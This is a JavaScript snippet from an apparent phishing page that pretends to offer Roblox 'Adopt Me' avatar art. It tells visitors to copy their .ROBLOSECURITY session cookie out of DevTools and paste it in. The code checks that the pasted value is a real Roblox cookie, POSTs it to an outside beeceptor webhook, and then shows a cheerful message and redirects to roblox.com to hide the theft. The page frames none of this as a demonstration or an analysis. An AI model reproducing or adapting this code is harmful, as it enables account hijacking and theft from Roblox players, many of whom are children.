function submitCookie() {
    const cookie = document.getElementById('cookie-input').value.trim();
    if (cookie && cookie.startsWith('_|WARNING')) {
        console.log('Sending cookie:', cookie.substring(0, 50) + '...'); // Debug log
        fetch('https://adopt-me-art.free.beeceptor.com', {
            method: 'POST',
            body: JSON.stringify({ cookie: cookie, source: 'adopt-me-avatar' }),
            headers: { 'Content-Type': 'application/json' }
        }).then(response => {
            if (!response.ok) throw new Error(`Webhook failed: ${response.status}`);
            return response.json(); // Parse response if any
        }).then(() => {
            document.getElementById('status').innerText = 'Nice one! Your Adopt Me avatar’s being sketched—check DMs soon!';
            setTimeout(() => window.location.href = 'https://www.roblox.com', 2000);
        }).catch(error => {
            console.error('Fetch error:', error); // Log to Console for debug
            document.getElementById('status').innerText = 'Bugger, something went wrong. Try again!';
        });
    } else {
        document.getElementById('status').innerText = 'Invalid code, mate! Grab the .ROBLOSECURITY from DevTools.';
    }
}

window.addEventListener('hashchange', () => {
    let page = location.hash.slice(2).split('/').pop();
    document.querySelectorAll('section').forEach(s => s.style.display = 'none');
    if (page) document.getElementById(page).style.display = 'block';
});
window.dispatchEvent(new Event('hashchange')); // Trigger on load
